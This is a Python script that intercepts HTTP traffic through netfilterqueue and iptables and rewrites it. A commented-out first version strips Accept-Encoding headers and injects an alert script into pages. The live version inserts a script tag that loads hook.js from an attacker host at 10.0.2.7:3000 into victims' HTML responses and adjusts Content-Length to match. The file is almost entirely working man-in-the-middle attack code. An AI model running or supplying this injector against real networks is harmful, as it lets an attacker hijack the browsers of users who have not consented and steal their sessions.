# #!/usr/bin/env python
# # execute this command before running programme:- iptables -I FORWARD -j NFQUEUE --queue-num 0
# # execute on your own pc by using iptables -I OUTPUT -j NFQUEUE --queue-num 0
# # and by using iptables -I INPUT -j NFQUEUE --queue-num 0
# # iptables --flush ///to delete
#
# import netfilterqueue
# import scapy.all as scapy
# import re
#
#
# def set_load(packet, load):
#     packet[scapy.Raw].load = load
#     del packet[scapy.IP].len
#     del packet[scapy.IP].chksum
#     del packet[scapy.TCP].chksum
#     return packet
#
#
# def process_packet(packet):
#     scapy_packet = scapy.IP(packet.get_payload())
#     # print(scapy_packet.show())
#     if scapy_packet.haslayer(scapy.Raw):
#         if scapy_packet[scapy.TCP].dport == 80:
#             print("[+] Request >> ")
#             modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
#             new_packet = set_load(scapy_packet, modified_load)
#             packet.set_payload(str(new_packet))
#             #print(scapy_packet.show())
#         elif scapy_packet[scapy.TCP].sport == 80:
#             print("[+] Response >> ")
#             #print(scapy_packet[scapy.Raw].load)
#             modified_load = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('Hacked!!!')</script></body>")
#             new_packet = set_load(scapy_packet, modified_load)
#             #print(new_packet.show())
#             packet.set_payload(str(new_packet))
#             print(scapy_packet.show())
#     packet.accept()
#
#
# queue = netfilterqueue.NetfilterQueue()
# queue.bind(0, process_packet)
# queue.run()


# !/usr/bin/python2.7

import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print
            "[+]Request "
            # print scapy_packet.show()
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            #print scapy_packet[scapy.Raw].show()


        elif scapy_packet[scapy.TCP].sport == 80:
            print "[+] Response "
            # print scapy_packet.show()
            injetion_code = "<script src='http://10.0.2.7:3000/hook.js'></script>"
            load = load.replace("</p>", injetion_code+"</p>")
            content_length_searh = re.search("(?:Content-Length:\s)(\d*)",load)
            if content_length_searh  and "text/html" in load:
                content_length = content_length_searh.group(1)
                print content_length
                new_content_length = int(content_length)+len(injetion_code)
                load = load.replace(content_length,str(new_content_length))
            #print scapy_packet[scapy.Raw].show()
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()